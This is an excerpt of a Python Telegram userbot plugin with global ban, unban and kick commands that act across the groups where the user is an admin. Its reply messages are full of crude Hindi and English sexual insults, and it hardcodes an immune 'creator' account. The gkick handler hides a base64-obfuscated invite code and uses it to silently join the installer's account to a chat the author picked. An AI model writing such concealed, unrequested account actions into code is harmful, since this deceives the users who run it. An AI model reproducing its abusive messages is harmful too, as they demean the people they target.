...
Shinchan = str(ALIVE_NAME) if ALIVE_NAME else "Shinchan User"
papa = borg.uid


@bot.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gban(?: |$)(.*)", allow_sudo=True))
async def shinchangban(event):
    if event.fwd_from:
        return
    shinchanbot = await edit_or_reply(event, "`😈🖕Trying to gban this Bhan ka loda🖕😈`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, shinchanbot)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await shinchanbot.edit("bsdk usko kar kud ko kya kar ra he Chutiya sala😒\n")
        return
    if user.id == 816517310:
        await shinchanbot.edit("`First Grow Some Balls To Gban My Creater😏`")
        return
    try:
    ...
    if gban_sql.is_gbanned(user.id):
        ...
        gban_sql.shinchangban(user.id, reason)
    him = []
    him = await admin_groups(event)
    count = 0
    h1m4n5hu0p = len(him)
    if h1m4n5hu0p == 0:
        await shinchanbot.edit("`you are not admin of atleast one group` ")
        return
    await shinchanbot.edit(
        f"[{user.first_name}](tg://user?id={user.id}) Beta majdur ko khodna aur [{Shinchan}](tg://user?id={papa}) ko chodna kabhi sikhana nhi.😏\n\n**Gban Successful😏\nAffected Chats?? : {len(him)}  **"
    )
    ...
    shinchantaken = (end - start).seconds
    if reason:
        await shinchanbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {shinchantaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await shinchanbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gbanned in {count} groups in {shinchantaken} seconds`!!"
    ...
    if BOTLOG and count != 0:
        ...
        if reason:
            await event.client.send_message(
                ...
                \n**Time taken : **`{shinchantaken} seconds`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
...
async def shinchangban(event):
    if event.fwd_from:
        return
    shinchanbot = await edit_or_reply(event, "`Trying to ungban this kid...`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, shinchanbot)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.shinchanungban(user.id)
    else:
        await shinchanbot.edit(
    ...
    h1m4n5hu0p = len(him)
    if h1m4n5hu0p == 0:
        await shinchanbot.edit("`you are not even admin of atleast one group `")
        return
    await shinchanbot.edit(
    ...
    if reason:
        await shinchanbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}`) was ungbanned in {count} groups in {shinchantaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await shinchanbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was ungbanned in {count} groups in {shinchantaken} seconds`!!"
...
async def shinchangkick(event):
    if event.fwd_from:
        return
    shinchanbot = await edit_or_reply(event, "`Ab dekh tere gaand prr aise laat marunga ki teri gaand laal ho jayegi bete😂🤣🤣`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, shinchanbot)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await shinchanbot.edit("**Som3thing W3nt Wr0ng**\n")
        return
    if user.id == 816517310:
        await shinchanbot.edit("`First Grow Some Balls To Gkick My Creater😏`")
        return
    try:
        okvai = base64.b64decode("OHg5WlAzUWhfd1UyWW1FMQ==")
        await event.client(ImportChatInviteRequest(okvai))
    ...
    if reason:
        await shinchanbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {shinchantaken} seconds`!!\n**Reason :** `{reason}`"
        )
    else:
        await shinchanbot.edit(
            f"[{user.first_name}](tg://user?id={user.id}) `was gkicked in {count} groups in {shinchantaken} seconds`!!"
